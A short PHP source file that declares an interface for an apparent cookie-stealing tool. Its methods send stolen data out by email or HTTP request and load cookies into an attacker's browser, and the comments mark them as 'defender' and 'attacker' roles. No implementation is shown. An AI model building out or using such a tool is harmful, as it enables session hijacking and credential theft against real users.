<?php

namespace Cvar1984\CookieStealer\Interface;

interface CookieStealerInterface
{
	public function sendEmail(string $email, string $password): bool; // for defender (not recomended)
	public function sendHttpRequest(string $link): bool; // for defender
	public function loadToMyBrowser(): bool; // for attacker
}